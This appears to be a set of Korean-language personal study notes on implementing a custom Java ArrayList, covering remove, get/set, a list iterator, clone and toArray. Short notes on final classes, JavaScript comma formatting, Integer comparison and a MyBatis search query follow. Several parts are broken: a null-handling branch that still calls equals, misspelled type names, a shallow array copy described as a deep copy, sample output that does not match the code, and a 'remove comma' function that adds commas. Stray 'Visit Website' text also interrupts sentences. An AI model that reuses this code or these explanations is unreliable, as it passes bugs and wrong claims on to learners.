	if(value == null) { //index는 0부터 시작이라서 size-1
		for(int i = size-1; i>=0; i--) {
			if(elementData[i].equals(value)) {
				return i;
			}
		}
	}else {
		for(int i=size-1; i>=0; i--) {
			if(elementData[i].equals(value)) {
				return i;
			}
		}
	}
	return -1;
}
```

```
#)remove구현
-remove(int index): 특정 index의 요소를 삭제
-remove(Object value): 특정요소를 삭제
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/91.PNG" width="650" height="400" /><br><br>

```
@Override
@SuppressWarnings("unchecked")
public E remove(int index) {
	//1. 인덱스가 음수이거나, size보다 같거나 클경우
	//size는 요소개수 예를들어 6개인데 인덱스는 6이다라고하면 실질적으로 인덱스는 0부터시작하니
	//요소는 6개뿐인데 에러가난다.
	if(index < 0 || index >= size) {
		throw new IndexOutOfBoundsException();
	}

	//2. 반환(삭제)할 값 백업 - 삭제하는 값은 출력을 위해서 백업하는 것임
	E element = (E) elementData[index];

	//3. 요소 제거(명시적으로 요소를 null로 처리해주어야 GC가 수거해감)
	elementData[index] = null;

	//4. 배열 요소 이동(삭제한 요소의 뒤에 있는 모든 요소들을 한칸씩 당겨줘야함)
	for(int i=index; i<size-1; i++) {
		elementData[i] = elementData[i+1]; //뒤에있는요소(i+1)이 앞에 빠진곳(i) 채우기
		elementData[i+1] = null;
	}
	
	//5. 요소를 제거했으니 size도 감소
	size--;
	
	//6. 현재 배열이 capacity가 남아도는 상태이면 리사이징
	resize();

	//7. 백업한 삭제된 요소를 반환
	return element;

	//기본적으로 remove()메서드 스펙은 반환값을 삭제된 요소를 보내기 때문에,
	  리스트에서 요소를 삭제하기 전에 변수에 백업을 해야한다.
	  이때 가져오게되는 요소가 Object 타입이라 제네릭 E 타입으로 형변환해줘야 하는데, 
	  형변환 하는 과정에서 경고창이 뜨게 된다. 
	  제네릭 자체가 확인되지 않은 모호한 타입이라 그렇다. 
		
	  따라서 어차피 리스트에서 제네릭 타입으로만 요소를 다루기 때문에 
	  형 안정성이 확보되므로 @SuppressWarnings("unchecked") 어노테이션을 붙인다. 
	  한마디로 ClassCastException이 뜨지 않으니 이 경고들을 무시하겠다는 의미이다.

	  
	  Tip)@SuppressWarnings("unchecked") 어노테이션은 형 변환시 예외 가능성이 없을 확실한 경우에만 써주는 것이 좋다. 
	  그렇지 않으면 중요한 경고 메세지를 놓칠 수도 있기 때문이다.
}
```

```
#)remove(Object value)
remove(Object value) 메소드는 인덱스로 위치를 찾아서 그 요소를 삭제하는 것이 아닌, 
요소 자체를 뒤져서 찾아 삭제하는 동작이다. 

이때 중복된 같은 값의 요소가 있을 경우 indexOf() 메서드와 같이 가장 먼저 매칭되는 요소만 삭제된다.
remove(Object value) 메소드를 위와 같이 for문으로 일일히 구현해도 되지만, 
이번엔 먼저 만들었던 remove(int index) 메서드와 indexOf() 메서드를 재활용하여 조합하여 보다 간단하게 구현할 수 있다

@Override
public boolean remove(Object value) {
	//1. 먼저 해당 요소가 몇번째 위치에 존재하는지 인덱스를 얻어온다
	int idx = indexOf(value);

	//2. 만약 값이 -1 이면 삭제하고자 하는 값이 없으니 그대로 메서드를 종료
	if(idx == -1) return false;

	//3. 인덱스를 찾았으면 그대로 remove() 메서드로 넘겨 삭제한다.
	//remove메서드에서 size감소, 리사이징 하니까
	remove(idx);

	return true;
}
```

```
#) get/set 구현하기
add와 remove 까지 구현한 독자분들이라면 이 부분은 쉽게 구현이 가능할 것이다.
잊지말아야 할점은 get과 set 동작 역시 인덱스를 파라미터로 넘겨 리스트 요소를 가져오기 때문에 
적절치 않은 인덱스 범위에 대한 예외 처리를 해주어야 된다.

@SuppressWarnings("unchecked")
@Override
public E get(int index) {
	if(index < 0 || index >= size) { //요소보다 index가 넘어가니 에러
		throw new IndexOutOfBoundsException();
	}
	return (E) elementData[index]; //요소값 반환
}

@Override
public void set(int index, Object value) {
	if(index < 0 || index >= size) {
		throw new IndexOutBoundsException();
	}
	elementData[index] = value; //요소 교체
}
```
```
#)기타요소 구현
- size 구현
MyArrayList 클래스에서는 size 변수가 private 접근제한자를 갖기 때문에 만일 외부에서 참조가 필요하다면 
메서드를 통해 반환하는 식으로 처리해야 한다. 
만일 size 변수가 pubilc이라면 외부에서 고의적으로 size값을 바꿔버리면 MyArrayList  동작 자체가 이상해버릴수 있기 때문이다.

- isEmpty 구현
리스트가 비어있는지 아닌지 확인하려면 요소개수 비교

@Override
public boolean isEmpty() {
	return size == 0;
}

- clear 구현
모든 요소들을 지우기 위해 반복문으로 배열 전체를 순회하여 각 요소공간에
null을 대입하는 식으로 구성할 수도 있지만,
그냥 빈 배열을 넣어주면 훨씬 간단하다.

@Override
public void clear() {
	elementData = new Object[DEFAULT_CAPACITY];
	size = 0;
}

- contains 구현
indexOf() 메소드는 사용자가 찾고자 하는 요소(value)의 위치를 반환하는 메소드였다면, 
contains() 메서드는 사용자가 찾고자 하는 요소가 존재 하는지 안하는지를 반환하는 메소드다. 
찾고자 하는 요소가 존재한다면 true를, 존재하지 않는다면 false를 반환한다. 
이 역시 기존의 indexOf() 메서드를 재활용하여 매우 간단하게 구현할 수 있다.

 @Override
 public boolean contains(Obejct value) {
	return indexOf(value) >= 0 ? true : false; 
 }

 - toString 구현
 ArrayList 컬렉션 객체를 그대로 print 했을 때 별다른 작업없이
 배열로 이쁘게 출력되는 것을 봐았을거다. 아래처럼
 
 ArrayList<Integer> list = new ArrayList<>();
list.add(1);
list.add(2);
list.add(3);
list.add(4);

System.out.println(list); // [1, 2, 3, 4]

위에 처럼 되는이유는 ArrayList 클래스에는 Object 클래스의 toString() 메서드를 재정의해서
이쁘게 출력하도록 만들었기 떄문이다.
우리의 MyArrayList 컬렉션도 다음과 같이 간단하게 재정의하면
위와 같이 배열을 출력가능하다.

@Override
public String toString() {
	return Arrays.toString(elementData);
}
```

```
#)ArrayList 구현(심화편)
리스트를 순회할때 for문으로도 충분하지만 
이터레이터 패턴 기법을 사용해 순회하는 방법도 있는 걸 배웠을 것이다.

ListIterator 인터페이스는 Iterator 인터페이스를 상속받아 
여러 기능을 추가한 리스트용 이터레이터 인터페이스이다. 

Iterator 인터페이스는 컬렉션의 요소에 접근할 때 한 방향으로만 이동할 수 있지만, 
ListIterator 인터페이스는 양방향으로 이동이 가능하며, 요소의 추가, 삭제 기능도 지원한다.

//ListIterator 객체를 listIterator() 메서드를 통해 받음
ListIterator<Integer> iter = lnkList.listIterator();

//만일 다음 요소가 있다면 반복
while(iter.hasNext()) {
	System.out.println(iter.next()); //요소를 출력 및 반복위치를 뒤로 이동
}

//만일 이전 요소가 있다면 반복
while(iter.hasPrevious()) {
	System.out.println(iter.previous()); //요소를 출력하고 반복위치를 앞으로 이동
}
```

```
#) ListIterator 내부클래스 생성
public interface MyListIterator<T> {
	T next();

	boolean hasNext();

	T previous();

	boolean hasPrevious();

	void add(Object element);

	void remove();
}

그리고 ListIterator 내부클래스를 MyArrayList 클래스안에 중첩으로 선언해주고,
위에서 만든 MyListIterator 인터페이스를 implements 해준다.

Tip) ListIterator 내부클래스는 static이 아닌 일반 innerClass로 선언해주는데,
왜냐하면 외부클래스 MyArrayList의 내부배열을 참조하여 사용해야되기 때문이다.

public class MyArrayList<E> implements MyList<E> {

    private static final int DEFAULT_CAPACITY = 5; // 생성자로 배열이 생성될때 기본 용량
    private static final Object[] EMPTY_ELEMENTDATA = {}; // 빈 배열

    // ...
    // ...
    // ...
    
    // DIP 원칙을 위해 인터페이스를 상속
    class ListIterator implements MyListIterator<E> {
        private int nextIndex = 0; // 커서 위치

        public E next() {
        }

        public boolean hasNext() {
        }

        public E previos() {
        }

        public boolean hasPrevios() {
        }

        public void add(Object element) {
        }

        public void remove() {
        }
    }
    
    // 내부 클래스 ListIterator 객체를 만들어 반환
    public ListIterator listIterator() {
        return new ListIterator(); 
    }
}

ListIterator 내부 클래스를 만들었으면, 
내부 클래스를 인스턴스화 하여 반환해주는 listIterator() 메서드도 선언해준다. 

그러면 클라이언트에서 리스트 이터레이터 객체를 반환받을 준비가 끝나게 된다.
이렇게 이터레이터 자체는 간단하지만, 
여기서 유심히 살펴봐야 할 멤버는 nextIndex 변수이다. 
nextIndex 변수는 이터레이터가 현재 배열 어느 위치를 가리키고 
있는지에 대한 이터레이터 전용 커서 역할을 한다.
이 변수를 이용해서 size 처럼 리스트를 차례로 순회를 돌 것이며 또한 값을 반환하기도 할 것이다. 

다만 반환과 동시에 커서가 이동하기 때문에, 두뇌를 조금 회전해야 한다.
```

```
#)hasNext 구현
while 문의 반복 요소로 사용되는 멤버이며, 
순회할 요소가 남아있는지 체크하는 메서드이다. 
배열 요소의 갯수를 나타내는 size 변수값과 nextIndex를 비교하여 구현하면 된다.

@Override
public boolean hasNext() {
    // nextIndex가 배열 사이즈보다 작다는 것은 순회할 요소가 남아있다는 뜻
    return nextIndex < size();
}
```

```
#)next 구현
리스트 요소를 반환하고 이터레이터 커서를 다음으로 옮기는 메서드이다. 
증감연산자를 이용해 반환 및 인덱스 증가 로직을 한 줄로 처리하였다. 
그리고 @SuppressWarnings("unchecked") 어노테이션을 통해 제네릭 타입 형변환이 안전하다고 컴파일로 알려준다.

@Override
@SuppressWarnings("unchecked")
public E next() {
	//배열요소를 반환하고 nextIndex 1 증가
	return (E) elementData[nextIndex++]; //elementData[nextData]와 nextIndex++ 를 한줄로 합침
}
```

```
#)hasPrevious 구현
hasNext() 메서드의 반대버전이다.
주의할점은 인덱스가 0부터 시작한다고 해서, 0보다 크거나 같으면 안된다.
왜냐하면 이거 다음에 구현할 previous 메서드때문이다.

일단, 이거 먼저보자
@Override
public boolean hasPrevious() {
	// nextIndex가 0보다 크면 이전 요소가 남아있다는 뜻
    // 인덱스가 0부터 라고해서 >= 0 이 아니다. previous 메서드에서 --nextIndex를 하기 때문에 0보다 무조건 커야된다.
	return nextIndex > 0; //0보다 크면 true 반환
}

```

```
#)previous 구현
next 메서드의 로직을 반대로 구현하면 되지만, 증감 연산자의 위치가 다르다!!!

즉, next 로직은 값을 반환하고 커서를 뒤로 이동하는 것이라면, 
previous 로직은 커서를 앞으로 먼저 이동을하고 나서야 값을 반환한다는 순서의 차이점이 존재한다. 
왜냐하면 nextIndex 커서는 반환한 요소 다음 위치를 가리키는 특수한 인덱스 이기 때문이다.

@Override
@SuppressWarnings("unchecked")
public E previos() {
    // 배열 요소를 반환하고 nextIndex 1 감소
    return (E) elementData[--nextIndex]; // 이때 증감연산자를 앞에다 붙여주어야 한다
}
```

```
#)add / remove 구현
실제 리스트 이터레이터 메서드 목록을 보면 
요소를 추가하고 제거하는 기능도 따로 지원한다. 
비록 선택적 메서드이긴 하지만, 
리스트를 순회하면서 혹여나 수정할 것이 생긴다면 사용하라고 있는 것이다.

처음부터 생으로 구현할 필요없고 이미 add와 remove 기능은 
MyArrayList 클래스에서 구현을 하였으니 재활용 하면 된다. 

이때 내부 클래스에서 외부 클래스의 메서드를 불러오기 위해서는 
정규화된 thisVisit Website 라는 기법을 사용하여야 한다. 

상속 관계라면 super를 쓰면 되겠지만, 내부-외부 관계는 상속이 아니기 때문이다.
이때 remove 메서드에서 nextIndex 처리가 약간 복잡한데, 
nextIndex 자체가 반환한 다음 요소를 가리키는 것이니
previos 메서드 처럼 반드시 1을 감소 시켜야 한다.

@Override
public void add(Object element) {
    // 이터레이터 커서 위치에 요소를 추가
    MyArrayList.this.add(nextIndex, element);
}

@Override
public void remove() {
    // 이터레이터 커서 위치의 전 요소를 제거 (next 메서드 자체가 현재 위치의 요소를 반환하고 커서를 1 더하니까)
    MyArrayList.this.remove(nextIndex-1);

    // 요소가 배열에서 제거 되었으니 size가 줄어든다. 그리고 커서도 앞으로 당겨야 한다. (요소가 제거되었으니까)
    nextIndex--; 
}
```

```
#)clone 구현하기
객체를 단순히 = 대입 연산자로 할당하면, 요소가 복사 되는게 아니라 객체 주소가 복사되게 된다. 
왜냐하면 기본적으로 컬렉션들은 간단한 정수, 실수라도 모두 Wrapper 객체로 저장하기 때문에, 
사실 배열에 적재되어있는 요소들은 값 자체가 적재되어있는게 아니라 주소 번지값이 적재 되어있기 때문이다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/91.PNG" width="650" height="400" /><br><br>

```
따라서 컬렉션 자체도 객체이고 안에 들어있는 요소도 객체이기 때문에 
이들을 완벽히 clone 하기 위해서는 하나하나 순회하여 일일히 요소들을 복사하는 약간 딥(deep)한 작업이 필요하다.
객체 복사를 구현하기 위해서, 자바의 Object 클래스Visit Website에 있는 clone() 메서드를 재정의하여 구현할 것이다.

1. clone 메서드를 정의하고, CloneNotSupportedException을 throw한다.
2. MyArrayList 자체를 복사하여 변수에 저장한다.
3. 이때 복사 과정에서 배열 내용물이 그대로 복사되는데, 
   이때 복사되는 요소들은 객체 데이터가 아니라 주소 번지들이 복사되어 버린다.
4. 따라서 복사한 MyArrayList의 Object 배열을 재생성하고,
5. Arrays.copyOf 메서드를 이용해 요소의 객체들을 깊은 복사를 행하도록 한다.

@Override
public Object clone() throws CloneNotSupportedException {

    // 1. MyArrayList 자체를 복사하여 변수에 저장
    MyArrayList<?> cloneList = (MyArrayList<?>) super.clone();

    // 2. 복사한 MyArrayList의 Object 배열에 사이즈를 미리 지정하여 재생성
    cloneList.elementData = new Object[size];

    // 3. 리스트에 저장하는 데이터는 객체(reference 타입)이기 때문에 반드시 안의 요소들도 따로따로 복사를 해줘야 함
    // 새로운 배열 = Arrays.copyof(원본 배열, 원본 배열에서 복사하고 싶은 요소들의 범위);
	cloneList.elementData = Arrays.copyOf(elementData, size);

    return cloneList;
}

//정말로 객체의 깊은 복사가 이루어졌는지 확인
public static void main(String[] args) throws Exception{
	MyArrayList<Integer> l = new MyArrayList<>();
	l.add(new Integer(1));
	l.add(new Integer(2));
	
	//리스트 복사
	//우리가 구현한 clone을 통해 주소값 복사가 아닌 값을 복사하는지 확인
	MyArrayList<Integer> l2 = (MyArrayList<Integer>) l.clone();

	//리스트가 잘 복사되었는지 리스트 주소값이 다른지 비교
	System.out.println(l.hashCode());
	System.out.println(l2.hashCode());

	//리스트의 요소들이 서로 따로따로 인지 확인
	l2.set(1,new Integer(100)); //복사된 리스트에 다른 값을 대체
	l2.add(new Integer(200)); //복사된 리스트에 다른 값을 추가

	//toString을 재정의하였으니 배열을 이쁘게 출력
	System.out.println(l);
	System.out.println(l2);

	//결과
	460141958
	1163157884
[1,2,3,null,null]
[1,100,3,200,null,null]
}
```

```
//배열 [] -> 리스트 (수작업)
class Main {
	public static void main(String[] args) {
		String[] arr = {"A","B","C","D"};

		List<String> list = new ArrayList<>();
		for(String v : arr) {
			list.add(v);
		}
	}
}

//배열 [] -> 리스트(수작업)
class Main {
	public static void main(String[] args) {
		 String[] arr = {"A", "B", "C", "D"};

    List<String> list = Arrays.asList(arr);
  }
}


```
```
#)toArray 구현
실제 리스트(가변)를 배열(고정)로 변환하는 toArray() 메서드에는 두가지 종류로 이용된다.
- Object[] toArray() : 리스트를 Object[] 배열로 
- T[] toArray(T[] a) : 리스트를 T[]배열로 변환하고 매개변수 a에 삽입

public static void main(String[] args) {
	ArrayList<Integer> list = new ArrayList<>(Arrays.asList(1,2,3));

	//toArray()
	//list를 배열로 변환하고 반환
	Object[] copy1 = list.toArray();
	System.out.println(Arrays.toString(copy1)); // [1,2,3]
}

Tip)마지막 배열 출력에서 null이 삽입되어 있는 이유는 자바 메서드 스펙이다.
javadoc에 따르면 삽입된 리스트의 길이를 알리기 위해서 일부로 null을 넣기 위해서 라고한다.
```
```
#)toArray() 구현
public Object[] toArray() {
	//Arrays.copyOf(원본배열,복사할길이)
	return Arrays.copyOf(elementData,size);
}

```

```
#)toArray(T[] a) 구현
1. 이 부분은 제네릭 메서드이므로 독립적인 타입파라미터 <T>를 갖는다.
2. 인자로 들어온 배열의 공간이 size 보다 크냐 크지않느냐에 따라 분기
3. 

```

```
#)final class
//String의 기존 클래스를 보면 아래와 같이 final로 선언되있다.
public final class String ... {

}

즉, extends String 이렇게 상속해서 쓸 수 없다는 의미이다.
보안상의 이유로 중요한 class의 자식 class를 생성해서 해당 class를 통해
시스템을 파괴할 수 있기 떄문이다.
class 상속이 안되니 당연히 내부의 모든 method들도 overriding이 불가능하다.

#)final method
class ParentClass {
	final void finalMethod() {}
}
class childClass extends ParentClass { //상속은 가능 
	void finalMethod() {} //컴파일 에러(오버라이딩 불가능)
}
주로 부모클래스에서 정의한 method 기능을 자식 클래스가 그대로 쓰도록 하기 위해 사용

```

```
document.getElementById('disposeMoney').value는 값이 문자열로 나온다.
그래서 Number(document.getElementById('disposeMoney').value) 로 해야 숫자끼리 비교가된다.

근데 form에 1,200 으로 내가 comma를 찍었을 때 원단위로 
이떄, parseInt든, Number든 문제가 생긴다. parseInt는 1로 나오고, Number는 Nan이 나온다.

그래서 콤마를 제거해줘야한다.
function comma(str) {
		str = String(str);
		return str.replace(/(\d)(?=(?:\d{3})+(?!\d))/g, '$1,');
}
```
```
#) int와 Integer 비교는 가능하다.
int a = 1, Integer c = new Integer(1) 
if(a==c) -> true가 나온다.

단, Integer와 Integer 비교시에는 false가 나온다.
Integer b = 1
Integer c = new Integer(c);
if(b==c) -> false(객체의 주소값을 비교하기 떄문, 그래서 equals써야된다.)
```

```
List의 add와 set의 차이가 있다!!
예를들어 List<TRCardResultCompareAnsVO> 라고 하면
paramList.add(0,vo) 이렇게 하면 0번째요소에 vo추가하고 뒤에있는요소는 밀려난다.

그러나, set은 paramList.set(0,vo)로 하면 기존 0번째 요소가 없어진다.
```

```
#)핵심은 WHERE 1=1 이다. 이게 없으면 if test 때문에 바로 WHERE AND ~가 될수도있어서 필요하다.
<select id = "searchEquipmentGridList" parameterType="TREquipmentMngVO" resultType="egovMap">
		SELECT 
		   EQ_KIND
		  ,CAR_NO
		  ,CONSIGNER
		  ,VH_NAME
		  ,MG_AREA
		  ,USE_DATE
		  ,USE_AREA
		  ,IN_COMPANY
		  ,RW_DATE
		  ,INS_PERIOD
		  ,SP_NOTE
		  ,MAX_LOAD
		  ,STD_LENGTH
		  ,STD_EXTENT
		  ,STD_AREA
		  ,VEHICLE_ID
		  ,EQ_REMARK
		FROM TREQMT
		WHERE 1=1
		<if test="schEqKind != null and !schEqKind.equals('')">
			<![CDATA[
				AND EQ_KIND = #{schEqKind}
			]]>
		</if>
		<if test="schCarNo != null and !schCarNo.equals('')">
			<![CDATA[
				AND CAR_NO LIKE CONCAT('%',#{schCarNo},'%')
			]]>
		</if>
	</select>


```
